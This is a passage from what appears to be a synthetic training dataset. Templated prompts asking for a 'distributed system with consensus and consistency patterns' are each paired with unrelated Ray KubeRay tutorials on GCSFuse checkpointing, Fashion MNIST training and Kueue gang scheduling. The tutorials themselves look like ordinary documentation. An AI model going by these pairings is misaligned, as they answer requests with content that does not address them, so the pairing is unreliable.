code](https://github.com/ray-project/kuberay/tree/master/ray-operator/config/samples/pytorch-resnet-image-classifier) is also in the KubeRay repository.\n\n```\ncurl -LO https://raw.githubusercontent.com/ray-project/kuberay/master/ray-operator/config/samples/pytorch-resnet-image-classifier/ray-job.pytorch-image-classifier.yaml\n```\n\nModify the RayJob by replacing all instances of the `GCS_BUCKET` placeholder with the Google Cloud Storage bucket you created earlier. Alternatively you can use `sed`:\n```\nsed -i \"s/GCS_BUCKET/$BUCKET/g\" ray-job.pytorch-image-classifier.yaml\n```\n\nDeploy the RayJob:\n```\nkubectl create -f ray-job.pytorch-image-classifier.yaml\n```\n\nThe deployed RayJob includes the following configuration to enable distributed checkpointing to a shared filesystem:\n* 4 Ray workers, each with a single GPU.\n* All Ray nodes use the `pytorch-distributed-training` ServiceAccount, which we created earlier.\n* Includes volumes that are managed by the `gcsfuse.csi.storage.gke.io` CSI driver.\n* Mounts a shared storage path `/mnt/cluster_storage`, backed by the GCS bucket you created earlier.\n\nYou can configure the Pod with annotations, which allows for finer grain control of the GCSFuse sidecar container. See [Specify Pod annotations](https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/cloud-storage-fuse-csi-driver#pod-annotations) for more details.\n```\nannotations:\n  gke-gcsfuse/volumes: \"true\"\n  gke-gcsfuse/cpu-limit: \"0\"\n  gke-gcsfuse/memory-limit: 5Gi\n  gke-gcsfuse/ephemeral-storage-limit: 10Gi\n```\n\nYou can also specify mount options when defining the GCSFuse container volume:\n```\ncsi:\n  driver: gcsfuse.csi.storage.gke.io\n  volumeAttributes:\n    bucketName: GCS_BUCKET\n    mountOptions: \"implicit-dirs,uid=1000,gid=100\"\n```\n\nSee [Mount options](https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/cloud-storage-fuse-csi-driver#mount-options) to learn more about mount options.\n\nLogs from the Ray job should indicate the use of the shared remote filesystem in `/mnt/cluster_storage` and the checkpointing directory. For example:\n```\nTraining finished iteration 10 at 2024-04-29 10:22:08. Total running time: 1min 30s\n╭─────────────────────────────────────────╮\n│ Training result                         │\n├─────────────────────────────────────────┤\n│ checkpoint_dir_name   checkpoint_000009 │\n│ time_this_iter_s                6.47154 │\n│ time_total_s                    74.5547 │\n│ training_iteration                   10 │\n│ acc                             0.24183 │\n│ loss                            0.06882 │\n╰─────────────────────────────────────────╯\nTraining saved a checkpoint for iteration 10 at: (local)/mnt/cluster_storage/finetune-resnet/TorchTrainer_cbb82_00000_0_2024-04-29_10-20-37/checkpoint_000009\n```\n\n## Inspect checkpointing data\n\nOnce the RayJob completes, you can inspect the contents of your bucket using a tool like [gsutil](https://cloud.google.com/storage/docs/gsutil).\n```\ngsutil ls gs://my-ray-bucket/**\ngs://my-ray-bucket/finetune-resnet/\ngs://my-ray-bucket/finetune-resnet/.validate_storage_marker\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000007/\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000007/checkpoint.pt\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000008/\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000008/checkpoint.pt\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009/\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009/checkpoint.pt\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/error.pkl\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/error.txt\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/events.out.tfevents.1714436502.orch-image-classifier-nc2sq-raycluster-tdrfx-head-xzcl8\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/events.out.tfevents.1714436809.orch-image-classifier-zz4sj-raycluster-vn7kz-head-lwx8k\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/params.json\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/params.pkl\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/progress.csv\ngs://my-ray-bucket/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/result.json\ngs://my-ray-bucket/finetune-resnet/basic-variant-state-2024-04-29_17-21-29.json\ngs://my-ray-bucket/finetune-resnet/basic-variant-state-2024-04-29_17-26-35.json\ngs://my-ray-bucket/finetune-resnet/experiment_state-2024-04-29_17-21-29.json\ngs://my-ray-bucket/finetune-resnet/experiment_state-2024-04-29_17-26-35.json\ngs://my-ray-bucket/finetune-resnet/trainer.pkl\ngs://my-ray-bucket/finetune-resnet/tuner.pkl\n\n```\n\n## Resuming from checkpoint\n\nIn the event of a failed job, you can use the latest checkpoint to resume training of the model. This example configures `TorchTrainer` to automatically resume\nfrom the latest checkpoint:\n```python\nexperiment_path = os.path.expanduser(\"/mnt/cluster_storage/finetune-resnet\")\nif TorchTrainer.can_restore(experiment_path):\n    trainer = TorchTrainer.restore(experiment_path,\n        train_loop_per_worker=train_loop_per_worker,\n        train_loop_config=train_loop_config,\n        scaling_config=scaling_config,\n        run_config=run_config,\n    )\nelse:\n    trainer = TorchTrainer(\n        train_loop_per_worker=train_loop_per_worker,\n        train_loop_config=train_loop_config,\n        scaling_config=scaling_config,\n        run_config=run_config,\n    )\n```\n\nYou can verify automatic checkpoint recovery by redeploying the same RayJob:\n```\nkubectl create -f ray-job.pytorch-image-classifier.yaml\n```\n\nIf the previous job succeeded, the training job should restore the checkpoint state from the `checkpoint_000009` directory\nand then immediately complete training with 0 iterations:\n```\n2024-04-29 15:51:32,528 INFO experiment_state.py:366 -- Trying to find and download experiment checkpoint at /mnt/cluster_storage/finetune-resnet\n2024-04-29 15:51:32,651 INFO experiment_state.py:396 -- A remote experiment checkpoint was found and will be used to restore the previous experiment state.\n2024-04-29 15:51:32,652 INFO tune_controller.py:404 -- Using the newest experiment state file found within the experiment directory: experiment_state-2024-04-29_15-43-40.json\n\nView detailed results here: /mnt/cluster_storage/finetune-resnet\nTo visualize your results with TensorBoard, run: `tensorboard --logdir /home/ray/ray_results/finetune-resnet`\n\nResult(\n  metrics={'loss': 0.070047477101968, 'acc': 0.23529411764705882},\n  path='/mnt/cluster_storage/finetune-resnet/TorchTrainer_ecc04_00000_0_2024-04-29_15-43-40',\n  filesystem='local',\n  checkpoint=Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_ecc04_00000_0_2024-04-29_15-43-40/checkpoint_000009)\n)\n```\n\nIf the previous job failed at an earlier checkpoint, the job should resume from the last saved checkpoint and run until `max_epochs=10`. For example, if the last run\nfailed at epoch 7, the training automatically resumes using `checkpoint_000006` and run 3 more iterations until epoch 10:\n```\n(TorchTrainer pid=611, ip=10.108.2.65) Restored on 10.108.2.65 from checkpoint: Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000006)\n(RayTrainWorker pid=671, ip=10.108.2.65) Setting up process group for: env:// [rank=0, world_size=4]\n(TorchTrainer pid=611, ip=10.108.2.65) Started distributed worker processes:\n(TorchTrainer pid=611, ip=10.108.2.65) - (ip=10.108.2.65, pid=671) world_rank=0, local_rank=0, node_rank=0\n(TorchTrainer pid=611, ip=10.108.2.65) - (ip=10.108.1.83, pid=589) world_rank=1, local_rank=0, node_rank=1\n(TorchTrainer pid=611, ip=10.108.2.65) - (ip=10.108.0.72, pid=590) world_rank=2, local_rank=0, node_rank=2\n(TorchTrainer pid=611, ip=10.108.2.65) - (ip=10.108.3.76, pid=590) world_rank=3, local_rank=0, node_rank=3\n(RayTrainWorker pid=589, ip=10.108.1.83) Downloading: \"https://download.pytorch.org/models/resnet50-0676ba61.pth\" to /home/ray/.cache/torch/hub/checkpoints/resnet50-0676ba61.pth\n(RayTrainWorker pid=671, ip=10.108.2.65)\n  0%|          | 0.00/97.8M [00:00<?, ?B/s]\n(RayTrainWorker pid=671, ip=10.108.2.65)\n 22%|██▏       | 21.8M/97.8M [00:00<00:00, 229MB/s]\n(RayTrainWorker pid=671, ip=10.108.2.65)\n 92%|█████████▏| 89.7M/97.8M [00:00<00:00, 327MB/s]\n(RayTrainWorker pid=671, ip=10.108.2.65)\n100%|██████████| 97.8M/97.8M [00:00<00:00, 316MB/s]\n(RayTrainWorker pid=671, ip=10.108.2.65) Moving model to device: cuda:0\n(RayTrainWorker pid=671, ip=10.108.2.65) Wrapping provided model in DistributedDataParallel.\n(RayTrainWorker pid=671, ip=10.108.2.65) Downloading: \"https://download.pytorch.org/models/resnet50-0676ba61.pth\" to /home/ray/.cache/torch/hub/checkpoints/resnet50-0676ba61.pth [repeated 3x across cluster] (Ray deduplicates logs by default. Set RAY_DEDUP_LOGS=0 to disable log deduplication, or see https://docs.ray.io/en/master/ray-observability/ray-logging.html#log-deduplication for more options.)\n(RayTrainWorker pid=590, ip=10.108.3.76)\n  0%|          | 0.00/97.8M [00:00<?, ?B/s] [repeated 3x across cluster]\n(RayTrainWorker pid=590, ip=10.108.0.72)\n 85%|████████▍ | 82.8M/97.8M [00:00<00:00, 256MB/s]\n100%|██████████| 97.8M/97.8M [00:00<00:00, 231MB/s] [repeated 11x across cluster]\n(RayTrainWorker pid=590, ip=10.108.3.76)\n100%|██████████| 97.8M/97.8M [00:00<00:00, 238MB/s]\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 7-train Loss: 0.0903 Acc: 0.2418\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 7-val Loss: 0.0881 Acc: 0.2353\n(RayTrainWorker pid=590, ip=10.108.0.72) Checkpoint successfully created at: Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000007)\n(RayTrainWorker pid=590, ip=10.108.0.72) Moving model to device: cuda:0 [repeated 3x across cluster]\n(RayTrainWorker pid=590, ip=10.108.0.72) Wrapping provided model in DistributedDataParallel. [repeated 3x across cluster]\n\nTraining finished iteration 8 at 2024-04-29 17:27:29. Total running time: 54s\n╭─────────────────────────────────────────╮\n│ Training result                         │\n├─────────────────────────────────────────┤\n│ checkpoint_dir_name   checkpoint_000007 │\n│ time_this_iter_s               40.46113 │\n│ time_total_s                   95.00043 │\n│ training_iteration                    8 │\n│ acc                             0.23529 │\n│ loss                            0.08811 │\n╰─────────────────────────────────────────╯\nTraining saved a checkpoint for iteration 8 at: (local)/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000007\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 8-train Loss: 0.0893 Acc: 0.2459\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 8-val Loss: 0.0859 Acc: 0.2353\n(RayTrainWorker pid=589, ip=10.108.1.83) Checkpoint successfully created at: Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000008) [repeated 4x across cluster]\n\nTraining finished iteration 9 at 2024-04-29 17:27:36. Total running time: 1min 1s\n╭─────────────────────────────────────────╮\n│ Training result                         │\n├─────────────────────────────────────────┤\n│ checkpoint_dir_name   checkpoint_000008 │\n│ time_this_iter_s                5.99923 │\n│ time_total_s                  100.99965 │\n│ training_iteration                    9 │\n│ acc                             0.23529 │\n│ loss                            0.08592 │\n╰─────────────────────────────────────────╯\nTraining saved a checkpoint for iteration 9 at: (local)/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000008\n2024-04-29 17:27:37,170 WARNING util.py:202 -- The `process_trial_save` operation took 0.540 s, which may be a performance bottleneck.\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 9-train Loss: 0.0866 Acc: 0.2377\n(RayTrainWorker pid=671, ip=10.108.2.65) Epoch 9-val Loss: 0.0833 Acc: 0.2353\n(RayTrainWorker pid=589, ip=10.108.1.83) Checkpoint successfully created at: Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009) [repeated 4x across cluster]\n\nTraining finished iteration 10 at 2024-04-29 17:27:43. Total running time: 1min 8s\n╭─────────────────────────────────────────╮\n│ Training result                         │\n├─────────────────────────────────────────┤\n│ checkpoint_dir_name   checkpoint_000009 │\n│ time_this_iter_s                6.71457 │\n│ time_total_s                  107.71422 │\n│ training_iteration                   10 │\n│ acc                             0.23529 │\n│ loss                            0.08333 │\n╰─────────────────────────────────────────╯\nTraining saved a checkpoint for iteration 10 at: (local)/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009\n\nTraining completed after 10 iterations at 2024-04-29 17:27:45. Total running time: 1min 9s\n2024-04-29 17:27:46,236 WARNING experiment_state.py:323 -- Experiment checkpoint syncing has been triggered multiple times in the last 30.0 seconds. A sync will be triggered whenever a trial has checkpointed more than `num_to_keep` times since last sync or if 300 seconds have passed since last sync. If you have set `num_to_keep` in your `CheckpointConfig`, consider increasing the checkpoint frequency or keeping more checkpoints. You can suppress this warning by changing the `TUNE_WARN_EXCESSIVE_EXPERIMENT_CHECKPOINT_SYNC_THRESHOLD_S` environment variable.\n\nResult(\n  metrics={'loss': 0.08333033206416111, 'acc': 0.23529411764705882},\n  path='/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29',\n  filesystem='local',\n  checkpoint=Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009)\n)\n(RayTrainWorker pid=590, ip=10.108.3.76) Checkpoint successfully created at: Checkpoint(filesystem=local, path=/mnt/cluster_storage/finetune-resnet/TorchTrainer_96923_00000_0_2024-04-29_17-21-29/checkpoint_000009) [repeated 3x across cluster]\n```\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/examples/distributed-checkpointing-with-gcsfuse.md", "language": "markdown", "complexity": "complex", "star_count": 38179, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 297}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-mnist-training-example)=\n\n# Train a PyTorch model on Fashion MNIST with CPUs on Kubernetes\n\nThis example runs distributed training of a PyTorch model on Fashion MNIST with Ray Train. See [Train a PyTorch model on Fashion MNIST](train-pytorch-fashion-mnist) for more details.\n\n## Step 1: Create a Kubernetes cluster\n\nThis step creates a local Kubernetes cluster using [Kind](https://kind.sigs.k8s.io/). If you already have a Kubernetes cluster, you can skip this step.\n\n```sh\nkind create cluster --image=kindest/node:v1.26.0\n```\n\n## Step 2: Install KubeRay operator\n\nFollow [this document](kuberay-operator-deploy) to install the latest stable KubeRay operator from the Helm repository.\n\n## Step 3: Create a RayJob\n\nA RayJob consists of a RayCluster custom resource and a job that can you can submit to the RayCluster. With RayJob, KubeRay creates a RayCluster and submits a job when the cluster is ready. The following is a CPU-only RayJob description YAML file for MNIST training on a PyTorch model.\n\n```sh\n# Download `ray-job.pytorch-mnist.yaml`\ncurl -LO https://raw.githubusercontent.com/ray-project/kuberay/master/ray-operator/config/samples/pytorch-mnist/ray-job.pytorch-mnist.yaml\n```\n\nYou might need to adjust some fields in the RayJob description YAML file so that it can run in your environment:\n* `replicas` under `workerGroupSpecs` in `rayClusterSpec`: This field specifies the number of worker Pods that KubeRay schedules to the Kubernetes cluster. Each worker Pod requires 3 CPUs, and the head Pod requires 1 CPU, as described in the `template` field. A RayJob submitter Pod requires 1 CPU. For example, if your machine has 8 CPUs, the maximum `replicas` value is 2 to allow all Pods to reach the `Running` status.\n* `NUM_WORKERS` under `runtimeEnvYAML` in `spec`: This field indicates the number of Ray actors to launch (see `ScalingConfig` in this [Document](ray-train-configs-api) for more information). Each Ray actor must be served by a worker Pod in the Kubernetes cluster. Therefore, `NUM_WORKERS` must be less than or equal to `replicas`.\n* `CPUS_PER_WORKER`: This must be set to less than or equal to `(CPU resource request per worker Pod) - 1`. For example, in the sample YAML file, the CPU resource request per worker Pod is 3 CPUs, so `CPUS_PER_WORKER` must be set to 2 or less.\n\n```sh\n# `replicas` and `NUM_WORKERS` set to 2.\n# Create a RayJob.\nkubectl apply -f ray-job.pytorch-mnist.yaml\n\n# Check existing Pods: According to `replicas`, there should be 2 worker Pods.\n# Make sure all the Pods are in the `Running` status.\nkubectl get pods\n# NAME                                                             READY   STATUS    RESTARTS   AGE\n# kuberay-operator-6dddd689fb-ksmcs                                1/1     Running   0          6m8s\n# rayjob-pytorch-mnist-raycluster-rkdmq-small-group-worker-c8bwx   1/1     Running   0          5m32s\n# rayjob-pytorch-mnist-raycluster-rkdmq-small-group-worker-s7wvm   1/1     Running   0          5m32s\n# rayjob-pytorch-mnist-nxmj2                                       1/1     Running   0          4m17s\n# rayjob-pytorch-mnist-raycluster-rkdmq-head-m4dsl                 1/1     Running   0          5m32s\n```\n\nCheck that the RayJob is in the `RUNNING` status:\n\n```sh\nkubectl get rayjob\n# NAME                   JOB STATUS   DEPLOYMENT STATUS   START TIME             END TIME   AGE\n# rayjob-pytorch-mnist   RUNNING      Running             2024-06-17T04:08:25Z              11m\n```\n\n## Step 4: Wait until the RayJob completes and check the training results\n\nWait until the RayJob completes. It might take several minutes.\n\n```sh\nkubectl get rayjob\n# NAME                   JOB STATUS   DEPLOYMENT STATUS   START TIME             END TIME               AGE\n# rayjob-pytorch-mnist   SUCCEEDED    Complete            2024-06-17T04:08:25Z   2024-06-17T04:22:21Z   16m\n```\n\nAfter seeing `JOB_STATUS` marked as `SUCCEEDED`, you can check the training logs:\n\n```sh\n# Check Pods name.\nkubectl get pods\n# NAME                                                             READY   STATUS      RESTARTS   AGE\n# kuberay-operator-6dddd689fb-ksmcs                                1/1     Running     0          113m\n# rayjob-pytorch-mnist-raycluster-rkdmq-small-group-worker-c8bwx   1/1     Running     0          38m\n# rayjob-pytorch-mnist-raycluster-rkdmq-small-group-worker-s7wvm   1/1     Running     0          38m\n# rayjob-pytorch-mnist-nxmj2                                       0/1     Completed   0          38m\n# rayjob-pytorch-mnist-raycluster-rkdmq-head-m4dsl                 1/1     Running     0          38m\n\n# Check training logs.\nkubectl logs -f rayjob-pytorch-mnist-nxmj2\n\n# 2024-06-16 22:23:01,047 INFO cli.py:36 -- Job submission server address: http://rayjob-pytorch-mnist-raycluster-rkdmq-head-svc.default.svc.cluster.local:8265\n# 2024-06-16 22:23:01,844 SUCC cli.py:60 -- -------------------------------------------------------\n# 2024-06-16 22:23:01,844 SUCC cli.py:61 -- Job 'rayjob-pytorch-mnist-l6ccc' submitted successfully\n# 2024-06-16 22:23:01,844 SUCC cli.py:62 -- -------------------------------------------------------\n# ...\n# (RayTrainWorker pid=1138, ip=10.244.0.18)\n#   0%|          | 0/26421880 [00:00<?, ?it/s]\n# (RayTrainWorker pid=1138, ip=10.244.0.18)\n#   0%|          | 32768/26421880 [00:00<01:27, 301113.97it/s]\n# ...\n# Training finished iteration 10 at 2024-06-16 22:33:05. Total running time: 7min 9s\n# ╭───────────────────────────────╮\n# │ Training result               │\n# ├───────────────────────────────┤\n# │ checkpoint_dir_name           │\n# │ time_this_iter_s      28.2635 │\n# │ time_total_s          423.388 │\n# │ training_iteration         10 │\n# │ accuracy               0.8748 │\n# │ loss                  0.35477 │\n# ╰───────────────────────────────╯\n\n# Training completed after 10 iterations at 2024-06-16 22:33:06. Total running time: 7min 10s\n\n# Training result: Result(\n#   metrics={'loss': 0.35476621258825347, 'accuracy': 0.8748},\n#   path='/home/ray/ray_results/TorchTrainer_2024-06-16_22-25-55/TorchTrainer_122aa_00000_0_2024-06-16_22-25-55',\n#   filesystem='local',\n#   checkpoint=None\n# )\n# ...\n```\n\n## Clean up\n\nDelete your RayJob with the following command:\n\n```sh\nkubectl delete -f ray-job.pytorch-mnist.yaml\n```\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/examples/mnist-training-example.md", "language": "markdown", "complexity": "medium", "star_count": 38179, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 122}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-kueue-gang-scheduling-example)=\n\n# Gang Scheduling with RayJob and Kueue\n\nThis guide demonstrates how to use Kueue for gang scheduling RayJob resources, taking advantage of dynamic resource provisioning and queueing on Kubernetes.\n To illustrate the concepts, this guide uses the [Fine-tune a PyTorch Lightning Text Classifier with Ray Data](https://docs.ray.io/en/master/train/examples/lightning/lightning_cola_advanced.html) example.\n\n## Gang scheduling\n\nGang scheduling in Kubernetes ensures that a group of related Pods, such as those in a Ray cluster,\nonly start when all required resources are available. Having this requirement is crucial when working with expensive,\nlimited resources like GPUs.\n\n## Kueue\n\n[Kueue](https://kueue.sigs.k8s.io/) is a Kubernetes-native system that manages quotas\nand how jobs consume them. Kueue decides when:\n* To make a job wait.\n* To admit a job to start, which triggers Kubernetes to create Pods.\n* To preempt a job, which triggers Kubernetes to delete active Pods.\n\nKueue has native support for some KubeRay APIs. Specifically, you can use Kueue\nto manage resources that RayJob and RayCluster consume. See the\n[Kueue documentation](https://kueue.sigs.k8s.io/docs/overview/) to learn more.\n\n## Why use gang scheduling\n\nGang scheduling is essential when working with expensive, limited hardware accelerators like GPUs.\nIt prevents RayJobs from partially provisioning Ray clusters and claiming but not using the GPUs.\nKueue suspends a RayJob until the Kubernetes cluster and the underlying cloud provider can guarantee\nthe capacity that the RayJob needs to execute. This approach greatly improves GPU utilization and\ncost, especially when GPU availability is limited.\n\n## Create a Kubernetes cluster on GKE\n\nCreate a GKE cluster with the `enable-autoscaling` option:\n```bash\ngcloud container clusters create kuberay-gpu-cluster \\\n    --num-nodes=1 --min-nodes 0 --max-nodes 1 --enable-autoscaling \\\n    --zone=us-east4-c --machine-type e2-standard-4\n```\n\nCreate a GPU node pool with the `enable-queued-provisioning` option enabled:\n```bash\ngcloud container node-pools create gpu-node-pool \\\n  --accelerator type=nvidia-l4,count=1,gpu-driver-version=latest \\\n  --enable-queued-provisioning \\\n  --reservation-affinity=none  \\\n  --zone us-east4-c \\\n  --cluster kuberay-gpu-cluster \\\n  --num-nodes 0 \\\n  --min-nodes 0 \\\n  --max-nodes 10 \\\n  --enable-autoscaling \\\n  --machine-type g2-standard-4\n```\n\nThis command creates a node pool, which initially has zero nodes.\nThe `--enable-queued-provisioning` flag enables \"queued provisioning\" in the Kubernetes node autoscaler using the ProvisioningRequest API. More details are below.\nYou need to use the `--reservation-affinity=none` flag because GKE doesn't support Node Reservations with ProvisioningRequest.\n\n\n## Install the KubeRay operator\n\nFollow [Deploy a KubeRay operator](kuberay-operator-deploy) to install the latest stable KubeRay operator from the Helm repository.\nThe KubeRay operator Pod must be on the CPU node if you set up the taint for the GPU node pool correctly.\n\n## Install Kueue\n\nInstall the latest released version of Kueue.\n```\nkubectl apply --server-side -f https://github.com/kubernetes-sigs/kueue/releases/download/v0.8.2/manifests.yaml\n```\n\nSee [Kueue Installation](https://kueue.sigs.k8s.io/docs/installation/#install-a-released-version) for more details on installing Kueue.\n\n## Configure Kueue for gang scheduling\n\nNext, configure Kueue for gang scheduling. Kueue leverages the ProvisioningRequest API for two key tasks:\n1. Dynamically adding new nodes to the cluster when a job needs more resources.\n2. Blocking the admission of new jobs that are waiting for sufficient resources to become available.\n\nSee [How ProvisioningRequest works](https://cloud.google.com/kubernetes-engine/docs/how-to/provisioningrequest#how-provisioningrequest-works) for more details.\n\n### Create Kueue resources\n\nThis manifest creates the following resources:\n* [ClusterQueue](https://kueue.sigs.k8s.io/docs/concepts/cluster_queue/): Defines quotas and fair sharing rules\n* [LocalQueue](https://kueue.sigs.k8s.io/docs/concepts/local_queue/): A namespaced queue, belonging to a tenant, that references a ClusterQueue\n* [ResourceFlavor](https://kueue.sigs.k8s.io/docs/concepts/resource_flavor/): Defines what resources are available in the cluster, typically from Nodes\n* [AdmissionCheck](https://kueue.sigs.k8s.io/docs/concepts/admission_check/): A mechanism allowing components to influence the timing of a workload admission\n\n```yaml\n# kueue-resources.yaml\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ResourceFlavor\nmetadata:\n  name: \"default-flavor\"\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: AdmissionCheck\nmetadata:\n  name: rayjob-gpu\nspec:\n  controllerName: kueue.x-k8s.io/provisioning-request\n  parameters:\n    apiGroup: kueue.x-k8s.io\n    kind: ProvisioningRequestConfig\n    name: rayjob-gpu-config\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ProvisioningRequestConfig\nmetadata:\n  name: rayjob-gpu-config\nspec:\n  provisioningClassName: queued-provisioning.gke.io\n  managedResources:\n  - nvidia.com/gpu\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ClusterQueue\nmetadata:\n  name: \"cluster-queue\"\nspec:\n  namespaceSelector: {} # match all\n  resourceGroups:\n  - coveredResources: [\"cpu\", \"memory\", \"nvidia.com/gpu\"]\n    flavors:\n    - name: \"default-flavor\"\n      resources:\n      - name: \"cpu\"\n        nominalQuota: 10000 # infinite quotas\n      - name: \"memory\"\n        nominalQuota: 10000Gi # infinite quotas\n      - name: \"nvidia.com/gpu\"\n        nominalQuota: 10000 # infinite quotas\n  admissionChecks:\n  - rayjob-gpu\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: LocalQueue\nmetadata:\n  namespace: \"default\"\n  name: \"user-queue\"\nspec:\n  clusterQueue: \"cluster-queue\"\n```\n\nCreate the Kueue resources:\n```bash\nkubectl apply -f kueue-resources.yaml\n```\n\n:::{note}\nThis example configures Kueue to orchestrate the gang scheduling of GPUs. However, you can use other resources such as CPU and memory.\n:::\n\n## Deploy a RayJob\n\nDownload the RayJob that executes all the steps documented in [Fine-tune a PyTorch Lightning Text Classifier](https://docs.ray.io/en/master/train/examples/lightning/lightning_cola_advanced.html). The [source code](https://github.com/ray-project/kuberay/tree/master/ray-operator/config/samples/pytorch-text-classifier) is also in the KubeRay repository.\n\n```bash\ncurl -LO https://raw.githubusercontent.com/ray-project/kuberay/master/ray-operator/config/samples/pytorch-text-classifier/ray-job.pytorch-distributed-training.yaml\n```\n\nBefore creating the RayJob, modify the RayJob metadata with a label\nto assign the RayJob to the LocalQueue that you created earlier:\n```yaml\nmetadata:\n  generateName: pytorch-text-classifier-\n  labels:\n    kueue.x-k8s.io/queue-name: user-queue\n```\n\nDeploy the RayJob:\n```bash\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/dev-pytorch-text-classifier-r6d4p created\n```\n\n## Gang scheduling with RayJob\n\nFollowing is the expected behavior when you deploy a GPU-requiring RayJob to a cluster that initially lacks GPUs:\n* Kueue suspends the RayJob due to insufficient GPU resources in the cluster.\n* Kueue creates a ProvisioningRequest, specifying the GPU requirements for the RayJob.\n* The Kubernetes node autoscaler monitors ProvisioningRequests and adds nodes with GPUs as needed.\n* Once the required GPU nodes are available, the ProvisioningRequest is satisfied.\n* Kueue admits the RayJob, allowing Kubernetes to schedule the Ray nodes on the newly provisioned nodes, and the RayJob execution begins.\n\nIf GPUs are unavailable, Kueue keeps suspending the RayJob. In addition, the node autoscaler avoids\nprovisioning new nodes until it can fully satisfy the RayJob's GPU requirements.\n\nUpon creating a RayJob, notice that the RayJob status is immediately `suspended` despite the ClusterQueue having GPU quotas available.\n```bash\n$ kubectl get rayjob pytorch-text-classifier-rj4sg -o yaml\napiVersion: ray.io/v1\nkind: RayJob\nmetadata:\n  name: pytorch-text-classifier-rj4sg\n  labels:\n    kueue.x-k8s.io/queue-name: user-queue\n...\n...\n...\nstatus:\n  jobDeploymentStatus: Suspended  # RayJob suspended\n  jobId: pytorch-text-classifier-rj4sg-pj9hx\n  jobStatus: PENDING\n```\n\nKueue keeps suspending this RayJob until its corresponding ProvisioningRequest is satisfied.\nList ProvisioningRequest resources and their status with this command:\n```bash\n$ kubectl get provisioningrequest\nNAME                                                      ACCEPTED   PROVISIONED   FAILED   AGE\nrayjob-pytorch-text-classifier-nv77q-e95ec-rayjob-gpu-1   True       False         False    22s\n```\n\nNote the two columns in the output: `ACCEPTED` and 